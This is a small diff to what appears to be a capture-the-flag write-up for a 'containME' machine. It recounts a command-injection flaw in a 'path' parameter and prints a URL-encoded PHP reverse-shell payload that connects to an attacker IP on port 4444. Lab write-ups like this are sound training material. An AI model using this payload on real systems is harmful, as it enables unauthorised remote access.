@@ -49,6 +49,7 @@ And there exist path traversal command-injection vulnerability.<br/>
 ![](Assets/containME4.png)<br/>
 So using this I obtained a reverse shell on the machine.<br/>
 `http://<machine_IP>/index.php?path=/home;%20php%20-r%20%27$s=fsockopen(%22<attacker_IP>%22,4444);proc_open(%22sh%22,[$s,$s,$s],$p);%27`
+<br/>
 ![](Assets/containME5.png)<br/>
 There I found a local user mike and an executable file.<br/>
 ![](Assets/containME6.png)<br/>
